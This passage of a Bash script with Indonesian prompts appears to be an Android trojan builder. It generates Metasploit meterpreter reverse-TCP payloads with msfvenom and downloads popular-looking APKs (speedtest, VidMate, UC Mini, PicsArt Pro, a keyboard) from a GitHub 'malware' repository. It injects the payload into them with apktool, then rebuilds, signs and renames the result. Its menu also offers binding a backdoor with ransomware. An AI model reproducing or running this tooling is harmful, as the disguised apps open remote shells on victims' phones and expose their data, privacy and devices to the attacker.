        java -jar $path/Malware/.android/sign.jar malware.apk;mv malware.s.apk malware.apk > /dev/null 2>&1
        printf "\033[37;1m[\033[32;1m*\033[37;1m] signed backdoor,\033[32;1m succesfully\033[31;1m\n"
        sleep 0.025s
        printf "\033[37;1m[\033[32;1m*\033[37;1m] verification your backdoor, please wait\033[31;1m\n"
        sleep 0.025s
        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle your backdoor\033[31;1m\n"
        sleep 0.025s
        zipalign 4 malware.apk $nama.apk > /dev/null 2>&1
        printf "\033[37;1m[\033[32;1m*\033[37;1m] verification, \033[32;1m succesfully\033[31;1m\n"
        sleep 3

}

rename(){
read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] nama backdoor : "'\033[34;1m')" new
printf '\033[31;1m'

echo
cd $path/Malware && mv malware.apk $new.apk
printf "\033[31;1m[\033[32;1m✔\033[31;1m]\033[37;1m nama backdoor berhasil diubah menjadi ~>\033[31;1m $new\n"

}

function android(){
	clear
	baner
	echo
        printf "\033[31;1m\t[\033[32;1m1\033[31;1m]\033[37;1m Backdoor Android\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m2\033[31;1m]\033[37;1m Bind Backdoor original from template\033[31;1m\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m3\033[31;1m]\033[37;1m Bind Backdoor original from file\n"
        sleep 0.025
	printf "\033[31;1m\t[\033[32;1m4\033[31;1m]\033[37;1m Bind Backdoor + inject ransomware\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m0\033[31;1m]\033[37;1m kembali\n\n"
        read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
        sleep 0.025
        echo
        	if [ $xyz = "1"  ];
        	then
        	Backdoor

        	elif [ $xyz = "2"  ];
        	then
        	Backdoor_template

        	elif [ $xyz = "3"  ];
        	then
        	Backdoor_file

                elif [ $xyz = "4"  ];
                then
                Backdoor_ransomware

		elif [ $xyz = "0"  ];
		then
		run_metasploit

		else
		printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
	        sleep 2
		android

		fi
}

# fungsi android user input Backdoor android
#
function Backdoor(){
# fungsi user xyz 1
                sets
                sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/malware.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
                printf '\033[31;1m'
                
                echo
                printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
                printf '\033[31;1m'
                
                echo
                sleep 2
                rename
                sign
}

#fungsi android user input Backdoor template
#
function Backdoor_template(){
printf '\033[31;1m'
printf "\033[31;1m\t[\033[32;1m01\033[31;1m]\033[37;1m spyphone\033[31;1m\n"
sleep 0.025
printf "\033[31;1m\t[\033[32;1m02\033[31;1m]\033[37;1m speedtest\033[31;1m\n"
sleep 0.025
printf "\033[31;1m\t[\033[32;1m03\033[31;1m]\033[37;1m vidmate\033[31;1m\n"
sleep 0.025
printf "\033[31;1m\t[\033[32;1m04\033[31;1m]\033[37;1m wifi wps\033[31;1m\n"
sleep 0.025
printf "\033[31;1m\t[\033[32;1m05\033[31;1m]\033[37;1m uc mini\033[31;1m\n"
sleep 0.025
printf "\033[31;1m\t[\033[32;1m06\033[31;1m]\033[37;1m keyboard\033[31;1m\n"
sleep 0.025
printf "\033[31;1m\t[\033[32;1m07\033[31;1m]\033[37;1m g45\033[31;1m\n"
sleep 0.025
printf "\033[31;1m\t[\033[32;1m08\033[31;1m]\033[37;1m Design\033[31;1m\n"
sleep 0.025
printf "\033[31;1m\t[\033[32;1m09\033[31;1m]\033[37;1m Droidsql\033[31;1m\n"
sleep 0.025
printf "\033[31;1m\t[\033[32;1m10\033[31;1m]\033[37;1m ave play\033[31;1m\n"
sleep 0.025
printf "\033[31;1m\t[\033[32;1m11\033[31;1m]\033[37;1m indoxxi\033[31;1m\n"
sleep 0.025
printf "\033[31;1m\t[\033[32;1m12\033[31;1m]\033[37;1m picsart pro\033[31;1m\n"
sleep 0.025
printf "\033[31;1m\t[\033[32;1m00\033[31;1m]\033[37;1m kembali\033[31;1m\n"
sleep 0.025
printf "\033[31;1m\t[\033[32;1m**\033[31;1m]\n"
sleep 0.025
read -p "$(printf "\033[31;1m\t[\033[32;1m**\033[31;1m] choice : "'\033[34;1m')" xyz
sleep 0.025
echo
clear
	if [ $xyz = "1" ] || [ $xyz = "01"  ];
	then
	spyphone
	sign
	rename_Backdoor

	elif [ $xyz = "2" ] || [ $xyz = "02"  ];
	then
	speedtest
	sign
	rename_Backdoor

	elif [ $xyz = "3" ] || [ $xyz = "03"  ];
	then
	vidmate
	sign
	rename_Backdoor

	elif [ $xyz = "4" ] || [ $xyz = "04"  ];
	then
	wifiwps
	sign
	rename_Backdoor

	elif [ $xyz = "5" ] || [ $xyz = "05"  ];
	then
	uc
	sign
	rename_Backdoor

	elif [ $xyz = "6" ] || [ $xyz = "06"  ];
	then
	keyboard
	sign
	rename_Backdoor

	elif [ $xyz = "7" ] || [ $xyz = "07"  ];
	then
	g45
	sign
	rename_Backdoor

	elif [ $xyz = "8" ] || [ $xyz = "08"  ];
	then
	design
	sign
	rename_Backdoor

	elif [ $xyz = "9" ] || [ $xyz = "09"  ];
	then
	droidsql
	sign
	rename_Backdoor

	elif [ $xyz = "10" ] || [ $xyz = "10"  ];
	then
	ave
	sign
	rename_Backdoor

	elif [ $xyz = "11" ] || [ $xyz = "11"  ];
	then
	indoxxi
	sign
	rename_Backdoor

	elif [ $xyz = "12" ] || [ $xyz = "12"  ];
	then
	picsart
	sign
	rename_Backdoor

	elif [ $xyz = "0" ] || [ $xyz = "00"  ];
	then
	android

	else
	printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
	sleep 2
	printf '\033[31;1m'
	Backdoor_template

	fi

}

# Backdoor spyphone
#
function spyphone(){
        $fixjava
        sets
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
        printf '\033[31;1m'

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
        printf '\033[31;1m'

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download spyphone from template\033[31;1m\n"
        printf '\033[31;1m'

        echo
        cd $path/Malware
        wget https://github.com/K1M4K-ID/malware/blob/main/spyphone.apk?raw=true > /dev/null 2>&1
        mv spyphone.apk?raw=true spyphone.apk > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download\033[32;1m succesfully\033[31;1m\n"
        printf '\033[31;1m'

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle payload please wait\033[31;1m\n"
        printf '\033[31;1m'

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d payload.apk

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle spyphone please wait\033[31;1m\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d spyphone.apk

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Recompyle spyphone please wait\033[31;1m\033[31;1m\n"
        cd $path/Malware
        rm -fr spyphone/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit spyphone/smali/com/metasploit

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild spyphone please wait\033[31;1m\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool b spyphone -o malware.apk
        rm -fr spyphone.apk spyphone payload payload.apk

}

# fungsi Backdoor speedtest
#
function speedtest(){
        $fixjava
        sets
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download speedtest from template\033[31;1m\n"

        echo
        cd $path/Malware
        wget https://github.com/K1M4K-ID/malware/blob/main/speedtest.apk?raw=true > /dev/null 2>&1
        mv speedtest.apk?raw=true speedtest.apk > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download\033[32;1m succesfully\033[31;1m\033[31;1m\n"

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle payload please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d payload.apk

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle speedtest please wait\033[31;1m\n"
        cd $path/Malware

        echo
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d speedtest.apk

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Recompyle speedtest please wait\033[31;1m\n"
        cd $path/Malware
        rm -fr speedtest/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit speedtest/smali/com/metasploit

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild speedtest please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool b speedtest -o malware.apk
        rm -fr speedtest.apk speedtest payload payload.apk

}

# fungsi Backdoor vidmate
#
function vidmate(){
        $fixjava
        sets
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download vidmate from template\033[31;1m\n"

        echo
        cd $path/Malware
        wget https://github.com/K1M4K-ID/malware/blob/main/vidmate.apk?raw=true > /dev/null 2>&1
        mv vidmate.apk?raw=true vidmate.apk > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download\033[32;1m succesfully\033[31;1m\n"

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle payload please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d payload.apk

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle vidmate please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d vidmate.apk

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Recompyle vidmate please wait\033[31;1m\n"
        cd $path/Malware
        rm -fr vidmate/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit vidmate/smali/com/metasploit

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild vidmate please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool b vidmate -o malware.apk
        rm -fr vidmate.apk vidmate payload payload.apk

}

# fungsi Backdoor wifi wps
#
function wifiwps(){
        $fixjava
        sets
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download wifi wps from template\033[31;1m\n"

        echo
        cd $path/Malware
        wget https://github.com/K1M4K-ID/malware/blob/main/wps.apk?raw=true > /dev/null 2>&1
        mv wps.apk?raw=true wps.apk > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download\033[32;1m succesfully\033[31;1m\n"

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle payload please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d payload.apk

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle wifi wps please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d wps.apk

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Recompyle wifi wps please wait\033[31;1m\n"
        cd $path/Malware
        rm -fr wps/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit wps/smali/com/metasploit

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild wifi wps please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool b wps -o malware.apk
        rm -fr wps.apk wps payload payload.apk

}

# fungsi Backdoor uc mini
#
function uc(){
        $fixjava
        sets
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download uc mini from template\033[31;1m\n"

        echo
        cd $path/Malware
        wget https://github.com/K1M4K-ID/malware/blob/main/uc.apk?raw=true > /dev/null 2>&1
        mv uc.apk?raw=true uc.apk > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download\033[32;1m succesfully\033[31;1m\n"

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle payload please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d payload.apk

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle uc mini please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d uc.apk

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Recompyle uc mini please wait\033[31;1m\n"
        cd $path/Malware
        rm -fr uc/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit uc/smali/com/metasploit

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild uc mini please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool b uc -o malware.apk
        rm -fr uc.apk uc payload payload.apk

}

# fungsi Backdoor keyboard hacker
#
function keyboard(){
        $fixjava
        sets
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download keyboard hacker from template\033[31;1m\n"

        echo
        cd $path/Malware
        wget https://github.com/K1M4K-ID/malware/blob/main/keyboard.apk?raw=true > /dev/null 2>&1
        mv keyboard.apk?raw=true keyboard.apk > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download\033[32;1m succesfully\033[31;1m\n"

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle payload please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d payload.apk

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle keyboard hacker please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d keyboard.apk

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Recompyle keyboard hacker please wait\033[31;1m\n"
        cd $path/Malware
        rm -fr keyboard/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit keyboard/smali/com/metasploit

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild keyboard hacker please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool b keyboard -o malware.apk
        rm -fr keyboard.apk keyboard payload payload.apk

}

# fungsi Backdoor g45
#
function g45(){
        $fixjava
        sets
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download g45 from template\033[31;1m\n"

        echo
        cd $path/Malware
        wget https://github.com/K1M4K-ID/malware/blob/main/g45.apk?raw=true > /dev/null 2>&1
        mv g45.apk?raw=true g45.apk > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download\033[32;1m succesfully\033[31;1m\n"

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle payload please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d payload.apk

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle g45 please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d g45.apk

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Recompyle g45 please wait\033[31;1m\n"
        cd $path/Malware
        rm -fr g45/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit g45/smali/com/metasploit

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild g45 please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool b g45 -o malware.apk
        rm -fr g45.apk g45 payload payload.apk

}

# fungsi Backdoor design
#
function design(){
        $fixjava
        sets
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download design from template\033[31;1m\n"

        echo
        cd $path/Malware
        wget https://github.com/K1M4K-ID/malware/blob/main/design.apk?raw=true > /dev/null 2>&1
        mv design.apk?raw=true design.apk > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download\033[32;1m succesfully\033[31;1m\n"

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle payload please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d payload.apk

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle design please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d design.apk

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Recompyle design please wait\033[31;1m\n"
        cd $path/Malware
        rm -fr design/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit design/smali/com/metasploit

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild design please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool b design -o malware.apk
        rm -fr design.apk design payload payload.apk

}

# fungsi Backdoor droidsqli
#
function droidsql(){
        $fixjava
        sets
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download droidsql from template\033[31;1m\n"

        echo
        cd $path/Malware
        wget https://github.com/K1M4K-ID/malware/blob/main/droidsqli.apk?raw=true > /dev/null 2>&1
        mv droidsqli.apk?raw=true droidsqli.apk > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download\033[32;1m succesfully\033[31;1m\n"

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle payload please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d payload.apk

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle droidsql please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d droidsqli.apk

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Recompyle droidsql please wait\033[31;1m\n"
        cd $path/Malware
        rm -fr droidsqli/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit droidsqli/smali/com/metasploit

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild droidsql please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool b droidsqli -o malware.apk
        rm -fr droidsqli.apk droidsqli payload payload.apk

}

# fungsi Backdoor ave player
#
function ave(){
        $fixjava
        sets
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download ave player from template\033[31;1m\n"

        echo
        cd $path/Malware
        wget https://github.com/K1M4K-ID/malware/blob/main/ave.apk?raw=true > /dev/null 2>&1
        mv ave.apk?raw=true ave.apk > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download\033[32;1m succesfully\033[31;1m\n"

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle payload please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d payload.apk

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle ave player please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d ave.apk

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Recompyle ave player please wait\033[31;1m\n"
        cd $path/Malware
        rm -fr ave/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit ave/smali/com/metasploit

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild ave player please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool b ave -o malware.apk
        rm -fr ave.apk ave payload payload.apk

}

# fungsi Backdoor indoxxi
#
function indoxxi(){
        $fixjava
        sets
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download indoxxi from template\033[31;1m\n"

        echo
        cd $path/Malware
        wget https://github.com/K1M4K-ID/malware/blob/main/indoxxi.apk?raw=true > /dev/null 2>&1
        mv indoxxi.apk?raw=true indoxxi.apk > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download\033[32;1m succesfully\033[31;1m\n"

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle payload please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d payload.apk

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle indoxxi please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d indoxxi.apk

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Recompyle indoxxi please wait\033[31;1m\n"
        cd $path/Malware
        rm -fr indoxxi/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit indoxxi/smali/com/metasploit

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild indoxxi please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool b indoxxi -o malware.apk
        rm -fr ave.apk ave payload payload.apk

}

# fungsi Backdoor piscart pro
#
function picsart(){
        $fixjava
        sets
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download piscart pro from template\033[31;1m\n"

        echo
        cd $path/Malware
        wget https://github.com/K1M4K-ID/malware/blob/main/piscart.apk?raw=true > /dev/null 2>&1
        mv piscart.apk?raw=true piscart.apk > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download\033[32;1m succesfully\033[31;1m\n"

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle payload please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d payload.apk

        echo
